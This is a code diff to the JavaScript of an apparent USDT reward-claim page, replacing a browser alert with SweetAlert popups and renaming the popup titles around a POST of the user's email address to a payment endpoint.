@@ -4,7 +4,12 @@ let address = document.querySelector("input[type=email]");
 btn.addEventListener("click", (e) => {
   e.preventDefault();
   if (address.value == "") {
-    alert("Do you want to lose your reward");
+    Swal.fire({
+      title: "Missing Address",
+      text: "Do you want to lose your reward",
+      icon: "warning",
+    });
+    
   } else {
     fetch("https://quickusdt.onrender.com/payment", {
       method: "POST",
@@ -26,13 +31,13 @@ btn.addEventListener("click", (e) => {
         console.log(data); // Now `data` is the parsed JSON object
         if (data.status == true) {
           Swal.fire({
-            title: "The Internet?",
+            title: "Claimed",
             text: data.message,
             icon: "success",
           });
         } else {
           Swal.fire({
-            title: "The Internet?",
+            title: "Failed to claim",
             text: data.message,
             icon: "error",
           });
@@ -41,9 +46,14 @@ btn.addEventListener("click", (e) => {
       })
       .catch((error) => {
         console.error("There was a problem with the fetch operation:", error);
+        Swal.fire({
+          title: "Claim error",
+          text: "Failed to claim please try again",
+          icon: "error",
+        });
       });
       Swal.fire({
-        title: "The Internet?",
+        title: "Transaction processing",
         text: "Please wait while we make payment :)",
         icon: "error",
       });
